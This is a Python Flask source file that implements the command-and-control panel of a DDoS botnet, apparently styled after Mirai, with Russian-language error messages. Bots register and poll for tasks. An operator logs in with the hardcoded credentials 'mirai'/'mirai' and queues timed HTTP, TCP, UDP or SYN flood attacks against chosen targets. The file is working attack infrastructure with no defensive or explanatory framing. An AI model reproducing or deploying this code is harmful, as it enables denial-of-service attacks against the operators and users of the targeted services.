from flask import Flask, session, request, render_template, redirect, url_for
import json, threading, time, socket, random

app = Flask(__name__)
app.config["SECRET_KEY"] = "0f517acba5bcfdcf0e26766b2c46e94ac3c5e0fb"

admin = {
	"mirai":"mirai"
}

bots  = []
tasks = {}

methods = {
	"HTTP":"l7",
	"TCP":"l4",
	"UDP":"l4",
	"SYN":"l4"
}



def sleep(times):
	for i in range(times):
		time.sleep(1)
		yield i

def isForm(form, key):
	try: return form[key]
	except: return False

def check(time, key):
	iss = True
	for i in sleep(int(time)):
		if isForm(tasks, key) == False:
			iss = False
			break
	if iss: tasks.pop(key)



@app.route("/")
@app.route("/home")
def home():
	if "user" in session:
		target = ""
		if len(list(tasks.keys())) != 0: target = "TARGET:"
		return render_template("target.html", count=str(len(bots)), target=target, tasks=list(tasks.values()))
	else:
		return redirect("/login")


@app.route("/login", methods=["POST", "GET"])
def login():
	if "user" in session:
		return redirect("/")

	if request.method == "GET":
		return render_template("login.html")
	else:
		user, passw = request.form["user"], request.form["passw"]
		if user in list(admin.keys()):
			if admin[user] == passw:
				session["user"] = user
				return redirect("/")
		return redirect("/login")


@app.route("/RegistrBot")
def RegistrBot():
	if (request.remote_addr in bots) != True:
		bots.append(request.remote_addr)
	return ""

@app.route("/GetTask")
def getTask():
	if (request.remote_addr in bots) != True:
		bots.append(request.remote_addr)
	return json.dumps(tasks)


@app.route("/AddTask", methods=["POST"])
def addTask():
	if "user" in session:
		Err, form = [], request.form
		forms = {"target":"Пустое поле Target.", "method":"Пустое поле Method.", "timess":"Пустое поле Time."}
		for i in list(forms.keys()):
			stats = isForm(form, i) 
			if stats == False: Err.append(forms[i])
			if stats != False and form[i] == "": Err.append(forms[i])
			if stats != False and methods[form["method"]] == "l4" and (("https://" or "http://") in form["target"]) != False:
				Err.append("Этот Target для L7")
			if stats != False and methods[form["method"]] == "l4": 
				try:
					print(32243)
					addr, port = form["target"].split(":")[0], int(form["target"].split(":")[1])
					socket.inet_aton(addr)
				except: Err.append("Неверный Target")
				try: int(form["timess"])
				except: Err.append("Неверно указано поле Time")

		try: assert form["method"] in list(methods.keys())
		except: Err.append("Метода не существует")
		
		if len(Err) != 0: 
			return f"{Err[0]}<br><br><a href=\"/home\">Назад</a>"
		else:
			key = str(random.getrandbits(30))
			tasks[key] = {"status":"_","target":form["target"],"time":form["timess"], "type":form["method"].lower(), "id":key}
			threading.Thread(target=check, args=(form["timess"], key)).start()
			return redirect("/home")
	else:
		return redirect("/login")

@app.route("/DelTask/<string:targets>")
def delTask(targets):
	try:tasks.pop(targets)
	except:pass
	return redirect("/home")

app.run(host="serverip", port=5000, debug=False)